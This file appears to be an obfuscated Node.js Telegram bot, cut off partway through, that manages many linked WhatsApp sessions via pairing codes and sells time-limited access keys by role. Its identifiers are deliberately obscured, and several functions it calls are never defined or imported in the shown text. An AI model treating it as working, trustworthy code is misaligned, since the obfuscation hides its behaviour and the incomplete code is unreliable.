const {
  Telegraf: _0x22d41e,
  Markup: _0x2a0035
} = require("telegraf");
const _0x131869 = require("fs");
const _0x1c7b9f = require("pino");
const _0x44539b = require("crypto");
const _0x17147b = require("chalk");
const _0xaff847 = require("path");
const _0x4502a1 = require("./database/config.js");
const _0x1bb862 = require("axios");
const _0x34bae4 = require("express");
const _0x2b0684 = require("node-fetch");
const _0x1cd873 = require("body-parser");
const _0x43a4a2 = require("cookie-parser");
const {
  spawn: _0x3ba42a
} = require("child_process");
const _0x3a013a = require("cors");
const {
  getUsers: _0x2a638b,
  saveUsers: _0x28fca2,
  loadAkses: _0x46577c,
  saveAkses: _0x7b9dc5,
  isOwner: _0x1cd92e,
  isAuthorized: _0x3ba39e
} = require("./user-manager.js");
const {
  activeSessions: _0x55cb79,
  savePersistentSessions: _0x95dde8,
  cleanupExpiredSessions: _0x28ab50,
  generateSessionId: _0x4c8c28
} = require("./session-store.js");
const _0x1aef89 = require("./tools.js");
const {
  tokens: _0x9d37bc,
  owners: _0x2acb62,
  ipvps: _0x10a471,
  port: _0xb0bfe8
} = _0x4502a1;
const _0x337bc3 = new _0x22d41e(_0x9d37bc);
const _0x556fad = _0x34bae4();
_0x556fad.use(_0x3a013a());
const _0x3de425 = new Map();
const _0x45a5b3 = new Map();
const _0x1fe44c = "./sessions.json";
const _0xb9e34a = "./auth";
const _0x4226a1 = _0xaff847.join(__dirname, "./database/user.json");
const _0x26eadd = _0xaff847.join(__dirname, "user_sessions.json");
const {
  getCountryCode: _0x1031b2,
  validatePhoneNumber: _0x5b96e1
} = require("./helpers/phone-helper.js");
const _0x28fb14 = new Map();
let _0xe1573b = null;
let _0x583e22;
function _0x312898(_0x5d19b0) {
  return new Promise(_0x484e99 => setTimeout(_0x484e99, _0x5d19b0));
}
function _0x45cf57(_0x281e68 = 4) {
  const _0x47cd73 = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  const _0x265590 = {
    length: _0x281e68
  };
  return Array.from(_0x265590, () => _0x47cd73.charAt(Math.floor(Math.random() * _0x47cd73.length))).join("");
}
function _0xd407b(_0x3ef53b) {
  const _0x2342a9 = _0x3ef53b.match(/^(\d+)([dh])$/);
  if (!_0x2342a9) {
    return null;
  }
  const _0x179dbc = parseInt(_0x2342a9[1]);
  const _0x989b40 = _0x2342a9[2];
  if (_0x989b40 === "d") {
    return _0x179dbc * 86400000;
  } else {
    return _0x179dbc * 3600000;
  }
}
function _0x51e222() {
  try {
    if (!_0x131869.existsSync(_0x26eadd)) {
      const _0x225134 = {};
      _0x131869.writeFileSync(_0x26eadd, JSON.stringify(_0x225134, null, 2));
      return _0x225134;
    }
    const _0x3b265f = _0x131869.readFileSync(_0x26eadd, "utf8").trim();
    if (!_0x3b265f) {
      return {};
    }
    let _0x329ced;
    try {
      _0x329ced = JSON.parse(_0x3b265f);
    } catch (_0x5a1c71) {
      console.error("[SESSION] JSON parse error:", _0x5a1c71.message);
      const _0x1cc0ef = _0x26eadd + ".backup-" + Date.now();
      _0x131869.copyFileSync(_0x26eadd, _0x1cc0ef);
      _0x329ced = {};
      _0x131869.writeFileSync(_0x26eadd, JSON.stringify(_0x329ced, null, 2));
    }
    if (typeof _0x329ced !== "object" || _0x329ced === null) {
      _0x329ced = {};
      _0x131869.writeFileSync(_0x26eadd, JSON.stringify(_0x329ced, null, 2));
    }
    let _0x590a1b = 0;
    Object.keys(_0x329ced).forEach(_0x50b843 => {
      if (!Array.isArray(_0x329ced[_0x50b843])) {
        delete _0x329ced[_0x50b843];
        _0x590a1b++;
      } else {
        const _0x2b9776 = _0x329ced[_0x50b843].length;
        _0x329ced[_0x50b843] = _0x329ced[_0x50b843].filter(_0x1cf417 => typeof _0x1cf417 === "string" && _0x1cf417.length >= 7 && _0x1cf417.length <= 15 && /^\d+$/.test(_0x1cf417));
        _0x590a1b += _0x2b9776 - _0x329ced[_0x50b843].length;
        const _0xf9a9d7 = [...new Set(_0x329ced[_0x50b843])];
        _0x590a1b += _0x329ced[_0x50b843].length - _0xf9a9d7.length;
        _0x329ced[_0x50b843] = _0xf9a9d7;
      }
    });
    Object.keys(_0x329ced).forEach(_0x5d1fc1 => {
      if (_0x329ced[_0x5d1fc1].length === 0) {
        delete _0x329ced[_0x5d1fc1];
        _0x590a1b++;
      }
    });
    const _0x48e5ed = Object.values(_0x329ced).reduce((_0x24cbed, _0x275a02) => _0x24cbed + _0x275a02.length, 0);
    if (_0x590a1b > 0) {
      _0x3575b9(_0x329ced);
    }
    return _0x329ced;
  } catch (_0x2c417a) {
    console.error("[SESSION] ❌ Error loading user_sessions.json:", _0x2c417a);
    return {};
  }
}
function _0x3575b9(_0x838dfe) {
  try {
    if (typeof _0x838dfe !== "object" || _0x838dfe === null) {
      console.error("[SESSION] Invalid data for saving, resetting...");
      _0x838dfe = {};
    }
    Object.keys(_0x838dfe).forEach(_0xdb2ac7 => {
      if (!Array.isArray(_0x838dfe[_0xdb2ac7]) || _0x838dfe[_0xdb2ac7].length === 0) {
        delete _0x838dfe[_0xdb2ac7];
      } else {
        _0x838dfe[_0xdb2ac7] = _0x838dfe[_0xdb2ac7].filter(_0x3bf2d6 => typeof _0x3bf2d6 === "string" && _0x3bf2d6.length >= 7 && _0x3bf2d6.length <= 15 && /^\d+$/.test(_0x3bf2d6));
        _0x838dfe[_0xdb2ac7] = [...new Set(_0x838dfe[_0xdb2ac7])];
      }
    });
    const _0x5bb61f = Object.values(_0x838dfe).reduce((_0x18b774, _0x4ac87e) => _0x18b774 + _0x4ac87e.length, 0);
    _0x131869.writeFileSync(_0x26eadd, JSON.stringify(_0x838dfe, null, 2));
    return true;
  } catch (_0x21f20c) {
    console.error("❌ Gagal menyimpan user_sessions.json:", _0x21f20c);
    return false;
  }
}
const _0x4a62f4 = (_0x1a22f1, _0x405310) => {
  const _0x243060 = _0xaff847.join(_0xb9e34a, "users", _0x1a22f1);
  const _0x3ec4a4 = _0xaff847.join(_0x243060, "device" + _0x405310);
  if (!_0x131869.existsSync(_0x3ec4a4)) {
    _0x131869.mkdirSync(_0x3ec4a4, {
      recursive: true
    });
  }
  return _0x3ec4a4;
};
function _0x11adaa(_0x33271d, _0x29b4bc) {
  const _0x80662b = _0x28fb14.get(_0x33271d);
  if (_0x80662b) {
    try {
      _0x80662b.write("data: " + JSON.stringify(_0x29b4bc) + "\n\n");
    } catch (_0x52b1b1) {
      console.error("[EVENT] Error sending event to " + _0x33271d + ":", _0x52b1b1.message);
      _0x28fb14.delete(_0x33271d);
    }
  }
}
let _0x4260b3 = false;
function _0x586fb9() {
  if (_0x4260b3) {
    return;
  }
  const _0x9e3a1a = _0x3de425.size;
  const _0x1494eb = _0x51e222();
  const _0x1b9990 = Object.values(_0x1494eb).reduce((_0x8a53dd, _0x188e1f) => _0x8a53dd + _0x188e1f.length, 0);
  console.log(_0x17147b.bold("\n📊  [HEALTH CHECK] Active: " + _0x9e3a1a + "/" + _0x1b9990 + " sessions"));
  if (_0x1b9990 > 0 && _0x9e3a1a < _0x1b9990) {
    const _0x4b4c94 = _0x1b9990 - _0x9e3a1a;
    console.log(_0x17147b.yellow("   ⚠️ Missing " + _0x4b4c94 + " sessions, attempting to reload..."));
    _0x4260b3 = true;
    _0x1cdda6();
    setTimeout(() => {
      _0x4260b3 = false;
      console.log(_0x17147b.green.bold("🔄 [HEALTH CHECK] Reload cycle completed"));
    }, 30000);
  } else if (_0x9e3a1a > 0) {
    console.log(_0x17147b.green("   ✅ All sessions are active"));
  }
}
setInterval(_0x586fb9, 120000);
setTimeout(_0x586fb9, 30000);
let _0x382791 = 0;
const _0x48f3f1 = 3;
async function _0xc8c7ac() {
  _0x382791++;
  console.log(_0x17147b.yellow.bold("\n[STARTUP] 🔄 Reload attempt " + _0x382791 + "/" + _0x48f3f1));
  const _0x31f84f = _0x51e222();
  if (Object.keys(_0x31f84f).length === 0) {
    console.log(_0x17147b.yellow("[STARTUP] 💡 No sessions to reload - waiting for users to add senders"));
    return;
  }
  await _0x1cdda6();
  setTimeout(() => {
    const _0x2bde80 = _0x3de425.size;
    console.log(_0x17147b.blue("\n[STARTUP] 📊 Current active sessions: " + _0x2bde80));
    if (_0x2bde80 === 0 && _0x382791 < _0x48f3f1) {
      console.log(_0x17147b.yellow.bold("[STARTUP] 🔄 No active sessions, retrying... (" + _0x382791 + "/" + _0x48f3f1 + ")"));
      setTimeout(() => {
        _0xc8c7ac();
      }, 10000);
    } else if (_0x2bde80 === 0) {
      console.log(_0x17147b.red("[STARTUP] ❌ All reload attempts failed - manual reconnection required"));
    } else {
      console.log(_0x17147b.green.bold("[STARTUP] ✅ SUCCESS: " + _0x2bde80 + " sessions active"));
    }
  }, 30000);
}
async function _0x1cdda6() {
  const _0xd5f71f = _0x51e222();
  if (Object.keys(_0xd5f71f).length === 0) {
    console.log(_0x17147b.yellow.bold("[RELOAD] 💡 No user sessions found"));
    return;
  }
  let _0x24fc3f = 0;
  let _0x11c759 = 0;
  let _0x335d9f = 0;
  for (const [_0x254905, _0x196a20] of Object.entries(_0xd5f71f)) {
    for (const _0x46277d of _0x196a20) {
      _0x24fc3f++;
      if (_0x3de425.has(_0x46277d)) {
        continue;
      }
      const _0x3ac446 = _0x4a62f4(_0x254905, _0x46277d);
      const _0x569285 = _0xaff847.join(_0x3ac446, "creds.json");
      if (_0x131869.existsSync(_0x569285)) {
        console.log(_0x17147b.cyan.bold("[RELOAD] 🔗 Connecting " + _0x46277d + "..."));
        try {
          const _0x249fb2 = await Promise.race([_0x2d69f1(_0x254905, _0x46277d, _0x3ac446), new Promise((_0x4842b6, _0x22c039) => setTimeout(() => _0x22c039(new Error("Connection timeout")), 60000))]);
          if (_0x249fb2) {
            _0x11c759++;
            console.log(_0x17147b.green.bold("[RELOAD] ✅ " + _0x46277d + " connected successfully"));
          }
        } catch (_0x43ec5a) {
          _0x335d9f++;
          console.log(_0x17147b.red.bold("[RELOAD] ❌ " + _0x46277d + " failed: " + _0x43ec5a.message));
        }
        await new Promise(_0x204659 => setTimeout(_0x204659, 2000));
      } else {
        console.log(_0x17147b.yellow.bold("[RELOAD] ⏭️ " + _0x46277d + " - No session files, skipping"));
        _0x335d9f++;
      }
    }
  }
}
setTimeout(() => {
  console.log(_0x17147b.blue.bold("\n" + "=".repeat(50)));
  console.log(_0x17147b.cyan.bold("🚀  STARTING AUTO-RELOAD OF WHATSAPP SESSIONS"));
  console.log(_0x17147b.blue.bold("=".repeat(50)));
  _0xc8c7ac();
}, 5000);
async function _0x29022b() {
  console.log(_0x17147b.cyan.bold("\n🔧 [STARTUP] Starting auto-reload of all sessions..."));
  const _0x49003f = _0x51e222();
  const _0x527aa7 = Object.values(_0x49003f).reduce((_0x13e08c, _0x2041f7) => _0x13e08c + _0x2041f7.length, 0);
  if (_0x527aa7 === 0) {
    return;
  }
  let _0x1ca019 = 0;
  let _0x21f382 = 0;
  for (const [_0x4af7b5, _0x2dc20f] of Object.entries(_0x49003f)) {
    for (const _0x13cc13 of _0x2dc20f) {
      try {
        const _0xc67055 = _0x4a62f4(_0x4af7b5, _0x13cc13);
        const _0x52b9a2 = _0xaff847.join(_0xc67055, "creds.json");
        if (_0x131869.existsSync(_0x52b9a2)) {
          setTimeout(async () => {
            try {
              const _0x4390f0 = await _0x2d69f1(_0x4af7b5, _0x13cc13, _0xc67055);
              if (_0x4390f0) {
                _0x1ca019++;
                console.log(_0x17147b.green("   ✅ Success: " + _0x13cc13));
                _0x3de425.set(_0x13cc13, _0x4390f0);
              }
            } catch (_0x57d848) {
              _0x21f382++;
              console.log(_0x17147b.yellow("   ⚠️ Warning: " + _0x13cc13 + " - " + _0x57d848.message));
            }
          }, Math.random() * 5000);
        } else {
          console.log(_0x17147b.gray("   ⏭️ Skipping " + _0x13cc13 + " - No creds.json found"));
          _0x21f382++;
        }
      } catch (_0x2af335) {
        console.error("   ❌ Error reloading " + _0x13cc13 + ":", _0x2af335.message);
        _0x21f382++;
      }
    }
  }
  setTimeout(() => {
    console.log(_0x17147b.bold("\n📊 [STARTUP] RELOAD SUMMARY:"));
    console.log(_0x17147b.green("   ✅ Successfully reloaded: " + _0x1ca019));
    console.log(_0x17147b.yellow("   ⚠️ Failed to reload: " + _0x21f382));
    console.log(_0x17147b.blue("   🔗 Total active sessions: " + _0x3de425.size));
  }, 15000);
}
setTimeout(() => {
  _0x29022b();
}, 8000);
const _0x2d69f1 = async (_0x56d800, _0x23ddd3, _0xc425f6) => {
  try {
    _0x11adaa(_0x56d800, {
      type: "status",
      message: "Memulai koneksi WhatsApp...",
      number: _0x23ddd3,
      status: "connecting"
    });
    const {
      state: _0x3489d9,
      saveCreds: _0x4a77ba
    } = await _0x459f16(_0xc425f6);
    const {
      version: _0x48b35e
    } = await _0x15cb66();
    const _0x1df5d2 = _0x52a865({
      auth: _0x3489d9,
      printQRInTerminal: false,
      logger: _0x1c7b9f({
        level: "silent"
      }),
      version: _0x48b35e,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false,
      retryRequestDelayMs: 2000,
      fireInitQueries: true,
      markOnlineOnConnect: false
    });
    return new Promise((_0x591c4a, _0x52bb20) => {
      let _0x253adb = false;
      let _0x2a9f26 = false;
      let _0x14b3eb;
      let _0x34d6e5 = 0;
      const _0xdddc52 = 3;
      const _0x5829e4 = () => {
        if (_0x14b3eb) {
          clearTimeout(_0x14b3eb);
        }
      };
      _0x1df5d2.ev.on("connection.update", async _0x2c47ba => {
        const {
          connection: _0x463e41,
          lastDisconnect: _0x4e9a16,
          qr: _0xd6fe36
        } = _0x2c47ba;
        console.log(_0x17147b.blue.bold("🔄 Connection update:", _0x463e41));
        if (_0x463e41 === "close") {
          const _0x5e0bc1 = _0x4e9a16?.error?.output?.statusCode;
          console.log(_0x17147b.red.bold(" 📴 Connection closed, status: " + _0x5e0bc1));
          _0x3de425.delete(_0x23ddd3);
          if (_0x5e0bc1 === _0x2fac77.loggedOut) {
            console.log("[" + _0x56d800 + "] 📵 Device logged out, cleaning session...");
            _0x11adaa(_0x56d800, {
              type: "error",
              message: "Device logged out, silakan scan ulang",
              number: _0x23ddd3,
              status: "logged_out"
            });
            if (_0x131869.existsSync(_0xc425f6)) {
              try {
                _0x131869.rmSync(_0xc425f6, {
                  recursive: true,
                  force: true
                });
              } catch (_0x5b030c) {
                console.error("[" + _0x56d800 + "] ❌ Failed to delete session folder:", _0x5b030c.message);
              }
            }
            const _0x1eace3 = _0x51e222();
            if (_0x1eace3[_0x56d800]) {
              _0x1eace3[_0x56d800] = _0x1eace3[_0x56d800].filter(_0x46e4f6 => _0x46e4f6 !== _0x23ddd3);
              _0x3575b9(_0x1eace3);
            }
            _0x5829e4();
            _0x52bb20(new Error("Device logged out, please pairing again"));
            return;
          }
          if (_0x5e0bc1 === _0x2fac77.restartRequired || _0x5e0bc1 === _0x2fac77.timedOut || _0x5e0bc1 === _0x2fac77.connectionLost) {
            if (_0x34d6e5 < _0xdddc52) {
              _0x34d6e5++;
              const _0x55f638 = {
                type: "status",
                message: "Mencoba menyambung kembali... (" + _0x34d6e5 + "/" + _0xdddc52 + ")",
                number: _0x23ddd3,
                status: "reconnecting"
              };
              _0x11adaa(_0x56d800, _0x55f638);
              console.log(_0x17147b.green.bold("🔄 Reconnect attempt " + _0x34d6e5 + " for " + _0x23ddd3));
              setTimeout(async () => {
                try {
                  const _0x1c53b9 = await _0x2d69f1(_0x56d800, _0x23ddd3, _0xc425f6);
                  _0x591c4a(_0x1c53b9);
                } catch (_0x11cca1) {
                  _0x52bb20(_0x11cca1);
                }
              }, 5000);
              return;
            } else {
              _0x11adaa(_0x56d800, {
                type: "error",
                message: "Gagal reconnect setelah beberapa percobaan",
                number: _0x23ddd3,
                status: "failed"
              });
            }
          }
          if (!_0x253adb) {
            _0x5829e4();
            _0x11adaa(_0x56d800, {
              type: "error",
              message: "Koneksi gagal dengan status: " + _0x5e0bc1,
              number: _0x23ddd3,
              status: "failed"
            });
            _0x52bb20(new Error("Connection failed with status: " + _0x5e0bc1));
          }
        }
        if (_0x463e41 === "open") {
          console.log(_0x17147b.green.bold("✅ CONNECTED SUCCESSFULLY!"));
          _0x253adb = true;
          _0x5829e4();
          _0x3de425.set(_0x23ddd3, _0x1df5d2);
          const _0x448f15 = _0x51e222();
          if (!_0x448f15[_0x56d800]) {
            _0x448f15[_0x56d800] = [];
          }
          if (!_0x448f15[_0x56d800].includes(_0x23ddd3)) {
            _0x448f15[_0x56d800].push(_0x23ddd3);
            _0x3575b9(_0x448f15);
          }
          _0x11adaa(_0x56d800, {
            type: "success",
            message: "Berhasil terhubung dengan WhatsApp!",
            number: _0x23ddd3,
            status: "connected"
          });
          _0x591c4a(_0x1df5d2);
        }
        if (_0x463e41 === "connecting") {
          _0x11adaa(_0x56d800, {
            type: "status",
            message: "Menghubungkan ke WhatsApp...",
            number: _0x23ddd3,
            status: "connecting"
          });
          if (!_0x131869.existsSync(_0xc425f6 + "/creds.json") && !_0x2a9f26) {
            _0x2a9f26 = true;
            setTimeout(async () => {
              try {
                console.log(_0x17147b.green("[" + _0x56d800 + "] 📞 Requesting pairing code for " + _0x23ddd3 + "..."));
                _0x11adaa(_0x56d800, {
                  type: "status",
                  message: "Meminta kode pairing...",
                  number: _0x23ddd3,
                  status: "requesting_code"
                });
                const _0x537c82 = await _0x1df5d2.requestPairingCode(_0x23ddd3);
                const _0x54d811 = _0x537c82.match(/.{1,4}/g)?.join("-") || _0x537c82;
                const _0x4b08f9 = {
                  type: "pairing_code",
                  message: "Kode Pairing Berhasil Digenerate!",
                  number: _0x23ddd3,
                  code: _0x54d811,
                  status: "waiting_pairing",
                  instructions: ["1. Buka WhatsApp di HP Anda", "2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device", "3. Masukkan kode pairing berikut:", "KODE: " + _0x54d811, "4. Kode berlaku 30 detik!"]
                };
                _0x11adaa(_0x56d800, _0x4b08f9);
                const _0x5014e1 = _0x51e222();
                if (!_0x5014e1[_0x56d800]) {
                  _0x5014e1[_0x56d800] = [];
                }
                if (!_0x5014e1[_0x56d800].includes(_0x23ddd3)) {
                  _0x5014e1[_0x56d800].push(_0x23ddd3);
                  _0x3575b9(_0x5014e1);
                }
              } catch (_0x49663b) {
                console.error("[" + _0x56d800 + "] ❌ Error requesting pairing code:", _0x49663b.message);
                _0x11adaa(_0x56d800, {
                  type: "error",
                  message: "Gagal meminta kode pairing: " + _0x49663b.message,
                  number: _0x23ddd3,
                  status: "code_error"
                });
              }
            }, 3000);
          }
        }
        if (_0xd6fe36) {
          _0x11adaa(_0x56d800, {
            type: "qr",
            message: "Scan QR Code berikut:",
            number: _0x23ddd3,
            qr: _0xd6fe36,
            status: "waiting_qr"
          });
          const _0x54cb4a = _0x51e222();
          if (!_0x54cb4a[_0x56d800]) {
            _0x54cb4a[_0x56d800] = [];
          }
          if (!_0x54cb4a[_0x56d800].includes(_0x23ddd3)) {
            _0x54cb4a[_0x56d800].push(_0x23ddd3);
            _0x3575b9(_0x54cb4a);
          }
        }
      });
      _0x1df5d2.ev.on("creds.update", _0x4a77ba);
      _0x1df5d2.ev.on("connection.close", () => {
        console.log(_0x17147b.green("[" + _0x56d800 + "] 🔌 Connection closed event for " + _0x23ddd3));
        _0x3de425.delete(_0x23ddd3);
      });
      _0x14b3eb = setTimeout(() => {
        if (!_0x253adb) {
          console.log(_0x17147b.red("[" + _0x56d800 + "] ⏱️ Connection timeout for " + _0x23ddd3));
          _0x11adaa(_0x56d800, {
            type: "error",
            message: "Timeout - Tidak bisa menyelesaikan koneksi dalam 180 detik",
            number: _0x23ddd3,
            status: "timeout"
          });
          _0x3de425.delete(_0x23ddd3);
          _0x5829e4();
          _0x52bb20(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 180000);
    });
  } catch (_0x2ba5fe) {
    console.error("[" + _0x56d800 + "] ❌ Error in connectToWhatsAppUser:", _0x2ba5fe);
    _0x3de425.delete(_0x23ddd3);
    _0x11adaa(_0x56d800, {
      type: "error",
      message: "Error: " + _0x2ba5fe.message,
      number: _0x23ddd3,
      status: "error"
    });
    throw _0x2ba5fe;
  }
};
const _0x224348 = new Map();
const _0x13d86b = new Map();
_0x337bc3.command("start", async _0x5b6735 => {
  const _0x3092de = _0x5b6735.from.username || _0x5b6735.from.first_name || "Unknown";
  const _0x10c67f = _0x4502a1.botSettings.startImage;
  try {
    await _0x5b6735.deleteMessage();
  } catch (_0x4b049d) {}
  await _0x5b6735.replyWithPhoto(_0x10c67f, {
    caption: _0x4502a1.messages.getStartCaption(_0x3092de, _0x4502a1.botSettings),
    parse_mode: "HTML",
    ..._0x2a0035.inlineKeyboard([_0x4502a1.botSettings.buttons.map(_0x56f20b => _0x2a0035.button.url(_0x56f20b.text, _0x56f20b.url))])
  });
  const _0x6c2d79 = await _0x5b6735.replyWithPoll(_0x4502a1.botSettings.pollTitle, _0x4502a1.botSettings.pollOptions, {
    is_anonymous: false,
    type: "regular",
    allows_multiple_answers: false,
    open_period: 60
  });
  const _0x2560ff = await _0x5b6735.reply("⏳ <b>Silakan pilih menu di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
    parse_mode: "HTML"
  });
  _0x224348.set(_0x6c2d79.poll.id, {
    adminId: _0x5b6735.from.id,
    adminChatId: _0x5b6735.chat.id,
    pollMessageId: _0x6c2d79.message_id,
    infoMessageId: _0x2560ff.message_id,
    type: "start_menu",
    timestamp: Date.now()
  });
  setTimeout(async () => {
    const _0x83f9ba = _0x224348.get(_0x6c2d79.poll.id);
    if (_0x83f9ba) {
      try {
        await _0x5b6735.telegram.deleteMessage(_0x83f9ba.adminChatId, _0x83f9ba.pollMessageId);
        await _0x5b6735.telegram.deleteMessage(_0x83f9ba.adminChatId, _0x83f9ba.infoMessageId);
      } catch (_0x12aa1f) {}
      _0x224348.delete(_0x6c2d79.poll.id);
    }
  }, 60000);
});
_0x337bc3.command("ckey", async _0x1ede11 => {
  const _0x428b5e = _0x1ede11.from.id.toString();
  if (!_0x1cd92e(_0x428b5e)) {
    return _0x1ede11.reply("🚫 Akses ditolak. Hanya Owner yang bisa menggunakan command ini.");
  }
  const _0x2d3a23 = _0x1ede11.message.text.split(" ")[1];
  if (!_0x2d3a23 || !_0x2d3a23.includes(",")) {
    return _0x1ede11.reply("✗ Format: /ckey <username>,<durasi>,<telegram_id>\n\nContoh:\n• /ckey user1,30d,123456789\n• /ckey user2,7d,987654321\n\nDurasi: 7d, 30d, 365d\nNote: Role akan dipilih via polling");
  }
  const _0x5b28e9 = _0x2d3a23.split(",");
  const _0x507971 = _0x5b28e9[0].trim();
  const _0x24c158 = _0x5b28e9[1].trim();
  const _0x1fc31f = _0x5b28e9[2] ? _0x5b28e9[2].trim() : "";
  if (!_0x1fc31f || !/^\d+$/.test(_0x1fc31f)) {
    return _0x1ede11.reply("✗ Telegram ID harus berupa angka!");
  }
  const _0x2e5a08 = _0xd407b(_0x24c158);
  if (!_0x2e5a08) {
    return _0x1ede11.reply("✗ Format durasi salah! Gunakan contoh: 7d / 30d / 365d");
  }
  const _0x540a2b = _0x45cf57(6);
  const _0x1a48cf = Date.now() + _0x2e5a08;
  try {
    await _0x1ede11.deleteMessage();
  } catch (_0x11421d) {}
  const _0x5b86e0 = await _0x1ede11.replyWithPoll("🔑 Pilih Role untuk " + _0x507971, ["👑 Owner", "🔧 Admin", "👤 User", "❌ Cancel"], {
    is_anonymous: false,
    type: "regular",
    allows_multiple_answers: false,
    open_period: 60
  });
  const _0x42d408 = await _0x1ede11.reply("⏳ <b>Silakan pilih role di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
    parse_mode: "HTML"
  });
  _0x13d86b.set(_0x5b86e0.poll.id, {
    adminId: _0x428b5e,
    adminChatId: _0x1ede11.chat.id,
    pollMessageId: _0x5b86e0.message_id,
    infoMessageId: _0x42d408.message_id,
    username: _0x507971,
    key: _0x540a2b,
    expired: _0x1a48cf,
    telegramId: _0x1fc31f,
    durationStr: _0x24c158,
    type: "ckey",
    timestamp: Date.now()
  });
  setTimeout(async () => {
    const _0x11b657 = _0x13d86b.get(_0x5b86e0.poll.id);
    if (_0x11b657) {
      try {
        await _0x1ede11.telegram.deleteMessage(_0x11b657.adminChatId, _0x11b657.pollMessageId);
        await _0x1ede11.telegram.deleteMessage(_0x11b657.adminChatId, _0x11b657.infoMessageId);
      } catch (_0x43c319) {}
      try {
        await _0x1ede11.telegram.sendMessage(_0x11b657.adminId, "⏰ <b>Polling expired!</b>\n" + ("Pembuatan key untuk " + _0x11b657.username + " dibatalkan.\n") + "Silakan ulangi dengan /ckey", {
          parse_mode: "HTML"
        });
      } catch (_0x43ac6c) {}
      _0x13d86b.delete(_0x5b86e0.poll.id);
    }
  }, 300000);
});
_0x337bc3.command("listkey", async _0x9f3e55 => {
  const _0x33dd21 = _0x9f3e55.from.id.toString();
  const _0xb8801e = _0x2a638b();
  if (!_0x1cd92e(_0x33dd21)) {
    return _0x9f3e55.reply("[ ❗ ] - Hanya owner yang bisa mengakses command ini.");
  }
  if (_0xb8801e.length === 0) {
    return _0x9f3e55.reply("💢 Belum ada key yang dibuat.");
  }
  try {
    await _0x9f3e55.deleteMessage();
  } catch (_0x373cb0) {}
  const _0x3b4562 = _0xb8801e.slice(0, 10).map((_0x2c93f1, _0x52f82f) => _0x52f82f + 1 + ". " + _0x2c93f1.username + " (" + (_0x2c93f1.role || "user") + ")");
  _0x3b4562.push("📋 Lihat Semua");
  _0x3b4562.push("❌ Batal");
  const _0xab6365 = await _0x9f3e55.replyWithPoll("👥 Pilih User untuk Detail", _0x3b4562, {
    is_anonymous: false,
    type: "regular",
    allows_multiple_answers: false,
    open_period: 60
  });
  const _0x3f79a3 = await _0x9f3e55.reply("⏳ <b>Silakan pilih user di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
    parse_mode: "HTML"
  });
  _0x13d86b.set(_0xab6365.poll.id, {
    adminId: _0x33dd21,
    adminChatId: _0x9f3e55.chat.id,
    pollMessageId: _0xab6365.message_id,
    infoMessageId: _0x3f79a3.message_id,
    type: "listkey",
    users: _0xb8801e,
    timestamp: Date.now()
  });
  setTimeout(async () => {
    const _0x267388 = _0x13d86b.get(_0xab6365.poll.id);
    if (_0x267388 && _0x267388.type === "listkey") {
      try {
        await _0x9f3e55.telegram.deleteMessage(_0x267388.adminChatId, _0x267388.pollMessageId);
        await _0x9f3e55.telegram.deleteMessage(_0x267388.adminChatId, _0x267388.infoMessageId);
      } catch (_0x51d612) {}
      _0x13d86b.delete(_0xab6365.poll.id);
    }
  }, 300000);
});
_0x337bc3.command("delkey", async _0x5c0992 => {
  const _0x370535 = _0x5c0992.from.id.toString();
  if (!_0x1cd92e(_0x370535) && !_0x3ba39e(_0x370535)) {
    return _0x5c0992.reply("[ ❗ ] - Akses hanya untuk Owner/Admin.");
  }
  const _0x58c468 = _0x5c0992.message.text.split(" ")[1];
  if (!_0x58c468) {
    const _0x3a8a1a = _0x2a638b();
    if (_0x3a8a1a.length === 0) {
      return _0x5c0992.reply("💢 Tidak ada user yang bisa dihapus.");
    }
    try {
      await _0x5c0992.deleteMessage();
    } catch (_0xeb46e9) {}
    const _0x211606 = _0x3a8a1a.slice(0, 10).map((_0x116a00, _0x510247) => _0x510247 + 1 + ". " + _0x116a00.username + " (" + (_0x116a00.role || "user") + ")");
    _0x211606.push("❌ Batal");
    const _0x4ec65a = await _0x5c0992.replyWithPoll("🗑️ Pilih User untuk Dihapus", _0x211606, {
      is_anonymous: false,
      type: "regular",
      allows_multiple_answers: false,
      open_period: 60
    });
    const _0xc7b9bc = await _0x5c0992.reply("⏳ <b>Silakan pilih user di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
      parse_mode: "HTML"
    });
    _0x13d86b.set(_0x4ec65a.poll.id, {
      adminId: _0x370535,
      adminChatId: _0x5c0992.chat.id,
      pollMessageId: _0x4ec65a.message_id,
      infoMessageId: _0xc7b9bc.message_id,
      type: "delkey",
      users: _0x3a8a1a,
      timestamp: Date.now()
    });
    setTimeout(async () => {
      const _0x52a9db = _0x13d86b.get(_0x4ec65a.poll.id);
      if (_0x52a9db && _0x52a9db.type === "delkey") {
        try {
          await _0x5c0992.telegram.deleteMessage(_0x52a9db.adminChatId, _0x52a9db.pollMessageId);
          await _0x5c0992.telegram.deleteMessage(_0x52a9db.adminChatId, _0x52a9db.infoMessageId);
        } catch (_0x25866b) {}
        _0x13d86b.delete(_0x4ec65a.poll.id);
      }
    }, 300000);
  } else {
    const _0x10b928 = _0x58c468;
    const _0x4f2b8c = _0x2a638b();
    const _0x4c00b0 = _0x4f2b8c.findIndex(_0x337a3d => _0x337a3d.username === _0x10b928);
    if (_0x4c00b0 === -1) {
      return _0x5c0992.reply("✗ User `" + _0x10b928 + "` tidak ditemukan.", {
        parse_mode: "HTML"
      });
    }
    _0x4f2b8c.splice(_0x4c00b0, 1);
    _0x28fca2(_0x4f2b8c);
    _0x5c0992.reply("✅ <b>User berhasil dihapus</b>\n\n" + ("<b>Username:</b> <code>" + _0x10b928 + "</code>"), {
      parse_mode: "HTML"
    });
  }
});
_0x337bc3.on("poll_answer", async _0x1a7cc8 => {
  try {
    const _0x24d615 = _0x1a7cc8.pollAnswer;
    const _0x56ef8d = _0x24d615.poll_id;
    const _0x478717 = _0x24d615.user.id;
    const _0x50ffe8 = _0x24d615.option_ids;
    if (!_0x50ffe8 || _0x50ffe8.length === 0) {
      return;
    }
    const _0x32b606 = _0x50ffe8[0];
    const _0x5b4769 = _0x224348.get(_0x56ef8d);
